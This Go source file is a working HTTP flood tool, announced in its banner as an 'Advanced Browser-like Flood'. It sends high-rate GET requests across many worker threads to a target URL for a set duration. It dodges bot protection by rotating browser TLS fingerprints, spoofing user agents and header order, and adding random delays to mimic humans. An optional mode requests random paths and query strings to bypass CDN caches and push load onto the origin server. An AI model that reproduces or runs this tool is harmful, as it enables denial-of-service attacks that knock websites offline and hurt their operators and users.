package main

import (
	"context"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/bogdanfinn/tls-client/profiles"
	"golang.org/x/time/rate"

	http "github.com/bogdanfinn/fhttp"
	tls_client "github.com/bogdanfinn/tls-client"
)

var (
	// Multiple browser profiles for diversity
	browserProfiles = []profiles.ClientProfile{
		profiles.Chrome_120,
		profiles.Chrome_124,
		profiles.Firefox_120,
		profiles.Chrome_133_PSK,
		profiles.Chrome_131,
	}
	
	// Realistic User-Agents
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	}
	
	// Accept languages for diversity
	acceptLanguages = []string{
		"en-US,en;q=0.9",
		"en-US,en;q=0.9,th;q=0.8",
		"en-GB,en;q=0.9,en-US;q=0.8",
		"th-TH,th;q=0.9,en;q=0.8",
		"zh-CN,zh;q=0.9,en;q=0.8",
	}

	// Global statistics
	totalRequests   uint64
	successRequests uint64
	failedRequests  uint64
)

// Config holds the application configuration
type Config struct {
	Target   string
	Rate     int
	Duration int
	Threads  int
	Cached   bool
}

// Worker represents a flood worker
type Worker struct {
	id          int
	config      *Config
	limiter     *rate.Limiter
	client      tls_client.HttpClient
	clientMutex sync.Mutex
	stats       *WorkerStats
}

// WorkerStats tracks per-worker statistics
type WorkerStats struct {
	Requests uint64
	Success  uint64
	Failed   uint64
}

// WorkerPool manages a pool of workers
type WorkerPool struct {
	workers    []*Worker
	config     *Config
	limiter    *rate.Limiter
	ctx        context.Context
	cancel     context.CancelFunc
	wg         sync.WaitGroup
	startTime  time.Time
}

func main() {
	rand.Seed(time.Now().UnixNano())
	
	config, err := parseArgs()
	if err != nil {
		log.Fatal(err)
	}

	// Create context for graceful shutdown
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Setup signal handling
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	// Create worker pool
	pool := NewWorkerPool(ctx, cancel, config)
	
	// Start monitoring goroutine
	go pool.monitor()

	// Start workers
	pool.Start()

	// Wait for duration or interrupt
	select {
	case <-time.After(time.Duration(config.Duration) * time.Second):
		fmt.Println("\nDuration reached, stopping...")
	case <-sigChan:
		fmt.Println("\nInterrupt received, stopping...")
	}

	// Graceful shutdown
	pool.Stop()
	pool.PrintStats()
}

func parseArgs() (*Config, error) {
	if len(os.Args) < 5 {
		return nil, fmt.Errorf("Usage: %s <url> <rate> <secs> <threads> [--cached]", os.Args[0])
	}
	
	targetURL, err := url.Parse(os.Args[1])
	if err != nil {
		return nil, fmt.Errorf("Failed to parse url: %v", err)
	}
	if targetURL.Host == "" {
		return nil, fmt.Errorf("Invalid url provided")
	}
	
	rate, err := strconv.Atoi(os.Args[2])
	if err != nil || rate < 1 {
		return nil, fmt.Errorf("Invalid rate: %s", os.Args[2])
	}
	
	secs, err := strconv.Atoi(os.Args[3])
	if err != nil || secs < 1 {
		return nil, fmt.Errorf("Invalid duration: %s", os.Args[3])
	}
	
	threads, err := strconv.Atoi(os.Args[4])
	if err != nil || threads < 1 {
		return nil, fmt.Errorf("Invalid threads: %s", os.Args[4])
	}
	
	config := &Config{
		Target:   os.Args[1],
		Rate:     rate,
		Duration: secs,
		Threads:  threads,
		Cached:   false,
	}
	
	// Check for cached flag
	for _, arg := range os.Args {
		if strings.ToLower(arg) == "--cached" {
			config.Cached = true
			break
		}
	}
	
	if config.Cached {
		config.Target = prepareUrl(config.Target)
	}
	
	return config, nil
}

// NewWorkerPool creates a new worker pool
func NewWorkerPool(ctx context.Context, cancel context.CancelFunc, config *Config) *WorkerPool {
	// Create global rate limiter (requests per second)
	limiter := rate.NewLimiter(rate.Limit(config.Rate), config.Rate*2)
	
	pool := &WorkerPool{
		workers:   make([]*Worker, config.Threads),
		config:    config,
		limiter:   limiter,
		ctx:       ctx,
		cancel:    cancel,
		startTime: time.Now(),
	}
	
	// Initialize workers
	for i := 0; i < config.Threads; i++ {
		pool.workers[i] = &Worker{
			id:      i,
			config:  config,
			limiter: limiter,
			stats:   &WorkerStats{},
		}
	}
	
	return pool
}

// Start starts all workers
func (p *WorkerPool) Start() {
	fmt.Printf("Starting %d workers with rate limit of %d req/s\n", p.config.Threads, p.config.Rate)
	fmt.Println("Advanced Browser-like Flood by Context7 x bogdanfinn/tls-client!")
	fmt.Println("Press Ctrl+C to stop gracefully...")
	
	for _, worker := range p.workers {
		p.wg.Add(1)
		go worker.Run(p.ctx, &p.wg)
	}
}

// Stop stops all workers gracefully
func (p *WorkerPool) Stop() {
	p.cancel()
	p.wg.Wait()
}

// monitor prints statistics periodically
func (p *WorkerPool) monitor() {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-p.ctx.Done():
			return
		case <-ticker.C:
			p.PrintStats()
		}
	}
}

// PrintStats prints current statistics
func (p *WorkerPool) PrintStats() {
	total := atomic.LoadUint64(&totalRequests)
	success := atomic.LoadUint64(&successRequests)
	failed := atomic.LoadUint64(&failedRequests)
	
	elapsed := time.Since(p.startTime).Seconds()
	rps := float64(total) / elapsed
	
	fmt.Printf("\n[Stats] Total: %d | Success: %d | Failed: %d | RPS: %.2f | Duration: %.0fs\n",
		total, success, failed, rps, elapsed)
}

// Run executes the worker's main loop
func (w *Worker) Run(ctx context.Context, wg *sync.WaitGroup) {
	defer wg.Done()
	
	// Create initial client
	if err := w.refreshClient(); err != nil {
		log.Printf("Worker %d: Failed to create initial client: %v", w.id, err)
		return
	}
	
	// Client refresh timer
	refreshTicker := time.NewTicker(30 * time.Second)
	defer refreshTicker.Stop()
	
	for {
		select {
		case <-ctx.Done():
			w.closeClient()
			return
		case <-refreshTicker.C:
			// Periodically refresh client to avoid stale connections
			w.refreshClient()
		default:
			// Wait for rate limiter
			if err := w.limiter.Wait(ctx); err != nil {
				if ctx.Err() != nil {
					return
				}
				continue
			}
			
			// Perform request
			if w.config.Cached {
				w.performCachedRequest()
			} else {
				w.performRequest()
			}
		}
	}
}

// refreshClient creates a new HTTP client
func (w *Worker) refreshClient() error {
	w.clientMutex.Lock()
	defer w.clientMutex.Unlock()
	
	// Close existing client
	if w.client != nil {
		w.client.CloseIdleConnections()
	}
	
	// Create new client
	client, err := createRealisticClient()
	if err != nil {
		return err
	}
	
	w.client = client
	return nil
}

// closeClient closes the HTTP client
func (w *Worker) closeClient() {
	w.clientMutex.Lock()
	defer w.clientMutex.Unlock()
	
	if w.client != nil {
		w.client.CloseIdleConnections()
		w.client = nil
	}
}

// performRequest performs a single HTTP request
func (w *Worker) performRequest() {
	atomic.AddUint64(&totalRequests, 1)
	atomic.AddUint64(&w.stats.Requests, 1)
	
	req, err := http.NewRequest("GET", w.config.Target, nil)
	if err != nil {
		atomic.AddUint64(&failedRequests, 1)
		atomic.AddUint64(&w.stats.Failed, 1)
		return
	}
	
	// Set realistic headers
	req.Header = getRealisticHeaders()
	
	// Perform request with timeout
	w.clientMutex.Lock()
	client := w.client
	w.clientMutex.Unlock()
	
	if client == nil {
		atomic.AddUint64(&failedRequests, 1)
		atomic.AddUint64(&w.stats.Failed, 1)
		return
	}
	
	// Set request timeout
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	req = req.WithContext(ctx)
	
	res, err := client.Do(req)
	if err != nil {
		atomic.AddUint64(&failedRequests, 1)
		atomic.AddUint64(&w.stats.Failed, 1)
		return
	}
	defer res.Body.Close()
	
	// Drain response body
	_, _ = io.Copy(io.Discard, res.Body)
	
	atomic.AddUint64(&successRequests, 1)
	atomic.AddUint64(&w.stats.Success, 1)
	
	// Random small delay to simulate human behavior (1% chance)
	if rand.Intn(100) == 0 {
		time.Sleep(time.Duration(rand.Intn(50)+10) * time.Millisecond)
	}
}

// performCachedRequest performs a request with cache busting
func (w *Worker) performCachedRequest() {
	atomic.AddUint64(&totalRequests, 1)
	atomic.AddUint64(&w.stats.Requests, 1)
	
	// Generate random URL for cache busting
	randomUrl := strings.ReplaceAll(w.config.Target, "SOMESHIT.js", randPath())
	
	// Add random query parameters
	if rand.Intn(3) == 0 {
		params := url.Values{}
		params.Add("v", fmt.Sprintf("%d", rand.Intn(1000000)))
		params.Add("t", fmt.Sprintf("%d", time.Now().UnixNano()))
		if strings.Contains(randomUrl, "?") {
			randomUrl += "&" + params.Encode()
		} else {
			randomUrl += "?" + params.Encode()
		}
	}
	
	req, err := http.NewRequest("GET", randomUrl, nil)
	if err != nil {
		atomic.AddUint64(&failedRequests, 1)
		atomic.AddUint64(&w.stats.Failed, 1)
		return
	}
	
	// Set realistic headers
	req.Header = getRealisticHeaders()
	
	// Perform request with timeout
	w.clientMutex.Lock()
	client := w.client
	w.clientMutex.Unlock()
	
	if client == nil {
		atomic.AddUint64(&failedRequests, 1)
		atomic.AddUint64(&w.stats.Failed, 1)
		return
	}
	
	// Set request timeout
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	req = req.WithContext(ctx)
	
	res, err := client.Do(req)
	if err != nil {
		atomic.AddUint64(&failedRequests, 1)
		atomic.AddUint64(&w.stats.Failed, 1)
		return
	}
	defer res.Body.Close()
	
	// Drain response body
	_, _ = io.Copy(io.Discard, res.Body)
	
	atomic.AddUint64(&successRequests, 1)
	atomic.AddUint64(&w.stats.Success, 1)
	
	// Random small delay to simulate human behavior (1% chance)
	if rand.Intn(100) == 0 {
		time.Sleep(time.Duration(rand.Intn(50)+10) * time.Millisecond)
	}
}

func createRealisticClient() (tls_client.HttpClient, error) {
	// Random browser profile for TLS fingerprinting
	profile := browserProfiles[rand.Intn(len(browserProfiles))]
	
	// Create cookie jar for session persistence
	jar := tls_client.NewCookieJar()
	
	options := []tls_client.HttpClientOption{
		tls_client.WithTimeoutSeconds(15),
		tls_client.WithInsecureSkipVerify(),
		tls_client.WithClientProfile(profile),
		tls_client.WithCookieJar(jar),
		tls_client.WithNotFollowRedirects(),
	}

	return tls_client.NewHttpClient(tls_client.NewNoopLogger(), options...)
}

func getRealisticHeaders() http.Header {
	userAgent := userAgents[rand.Intn(len(userAgents))]
	acceptLang := acceptLanguages[rand.Intn(len(acceptLanguages))]
	
	// Vary cache control based on browser behavior
	cacheControls := []string{"no-cache", "max-age=0", "no-store"}
	cacheControl := cacheControls[rand.Intn(len(cacheControls))]
	
	headers := http.Header{
		"accept":                    {"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
		"accept-encoding":           {"gzip, deflate, br, zstd"},
		"accept-language":           {acceptLang},
		"cache-control":             {cacheControl},
		"pragma":                    {"no-cache"},
		"sec-ch-ua":                 {`"Google Chrome";v="120", "Chromium";v="120", "Not_A Brand";v="24"`},
		"sec-ch-ua-mobile":          {"?0"},
		"sec-ch-ua-platform":        {`"Windows"`},
		"sec-fetch-dest":            {"document"},
		"sec-fetch-mode":            {"navigate"},
		"sec-fetch-site":            {"none"},
		"sec-fetch-user":            {"?1"},
		"upgrade-insecure-requests": {"1"},
		"user-agent":                {userAgent},
	}
	
	// Critical: Header ordering exactly like real browsers
	if strings.Contains(userAgent, "Chrome") {
		headers[http.HeaderOrderKey] = []string{
			"accept",
			"accept-encoding", 
			"accept-language",
			"cache-control",
			"pragma",
			"sec-ch-ua",
			"sec-ch-ua-mobile",
			"sec-ch-ua-platform", 
			"sec-fetch-dest",
			"sec-fetch-mode",
			"sec-fetch-site",
			"sec-fetch-user",
			"upgrade-insecure-requests",
			"user-agent",
		}
	} else if strings.Contains(userAgent, "Firefox") {
		// Firefox has different header ordering
		headers[http.HeaderOrderKey] = []string{
			"accept",
			"accept-language",
			"accept-encoding",
			"cache-control",
			"pragma", 
			"upgrade-insecure-requests",
			"user-agent",
		}
		// Remove Chrome-specific headers
		delete(headers, "sec-ch-ua")
		delete(headers, "sec-ch-ua-mobile")
		delete(headers, "sec-ch-ua-platform")
		delete(headers, "sec-fetch-dest")
		delete(headers, "sec-fetch-mode")
		delete(headers, "sec-fetch-site")
		delete(headers, "sec-fetch-user")
	}
	
	return headers
}

func randPath() string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, rand.Intn(10)+5) // Random length 5-15
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	
	extensions := []string{".js", ".css", ".html", ".php", ".asp", ".jsp"}
	ext := extensions[rand.Intn(len(extensions))]
	return fmt.Sprintf("%s%s", string(b), ext)
}

func prepareUrl(urlToModify string) string {
	modified, err := url.Parse(urlToModify)
	if err != nil {
		log.Fatal("Failed to parse URL")
	}
	newPath := strings.TrimSuffix(modified.Path, "/") + "/SOMESHIT.js"
	modified.Path = newPath
	return modified.String()
}
